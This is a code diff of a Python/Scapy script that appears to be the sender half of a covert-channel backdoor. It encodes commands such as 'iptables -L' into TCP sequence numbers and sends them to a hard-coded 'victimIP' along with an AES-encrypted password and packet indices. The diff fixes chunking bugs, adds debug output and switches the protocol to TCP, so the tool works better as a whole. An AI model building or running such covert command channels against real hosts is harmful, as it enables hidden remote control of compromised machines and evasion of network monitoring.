@@ -5,7 +5,7 @@ from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
 import uuid #Used to generate UID's
 
 #Inputs
-victimIP = "192.168.0.2"
+victimIP = "192.168.0.15"
 ttlKey = 164
 srcPort = 80
 dstPort = 8000
@@ -26,27 +26,34 @@ def encrypt(message):
 
 #Conver the message to ascii to bits
 def messageToBits(message):
-	messageData = ''.join(str(ord(c)) for c in message)
-	#convert string to binary
-	messageData = bin(int(messageData))[2:]
-	return messageData
+    print "The message is " + message
+    messageData =""
+    for c in message:
+        #bin(int(messageData))[2:]
+        print "Char code is " + str(ord(c))
+        var = bin(ord(c))[2:].zfill(8)
+        print var
+        messageData += str(var)
+    print "Message data is " + messageData
+    return messageData
 
 def chunkMessage(message,protocol):
-	if(protocol == "TCP"):
+    print "Message is "  + message
+    if(protocol == "TCP"):
 		length = 32
-	elif(protocol == "UDP"):
+    elif(protocol == "UDP"):
 		length = 16
+    print str(len(message))
 
-	print str(len(message))
-	if(len(message) == length ):
-		output = []
-		output.append(message)
-		return message
-	elif(len(message) < length):
-		return message.zfill(length)
-	elif(len(message) > length):
-		rounds = len(message) / length
+    if(len(message) == length ):
+        output = []
+        output.append(message)
+        return message
+    elif(len(message) <= length):
+        return message.zfill(length)
+    elif(len(message) > length):
         #What will be left over after we chunk the length bit chunks
+        rounds = len(message) / length
         excess = len(message) % length
         print "Rounds is " + str(rounds)
         output = []
@@ -54,13 +61,19 @@ def chunkMessage(message,protocol):
         start = 0
         end = 0
         while(i < rounds):
+            print "ROUND:  #" + str(i)
             #print "This is round" + str(i)
-            start = i*length
-            end = (i*length)+(length - 1)
-            output.append(message[start:end])
+            start = i*length #0
+            print "START: " + str(start)
+            end = (i*length)+(length - 1) #31
+            print "END: " + str(end)
+            output.append(message[start:end+1])
             i = i + 1
+            print "END OF ROUND " + str(output)
+            print "LENGTH OF ROUND IS " + str(len(message[start:end+1]))
         #Get the remainder
         output.append(message[(end+1):(end+1+excess)])
+        print output
         return output
 
 def generateUID():
@@ -94,6 +107,7 @@ def craftPacket(data,protocol,position,total,UID):
 
     print "Crafting packet for # " + str(position) + " / " + str(total)
     if(protocol == "TCP"):
+        print "Put Data " + str(int(data,2)) + "into Seq Number"
         packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
         seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+UID+"\n"+str(position)+":" \
         + str(total)))
@@ -112,7 +126,7 @@ def sendmessage(protocol,message):
 	global IV
 
 	#1. Encrypt the message
-	message = encrypt(message)
+	#message = encrypt(message)
 
 	#2. Convert message to ASCII to Bits
 	message = messageToBits(message)
@@ -131,4 +145,4 @@ def sendmessage(protocol,message):
 
 #Main
 message = "iptables -L"
-sendmessage("UDP",message)
+sendmessage("TCP",message)
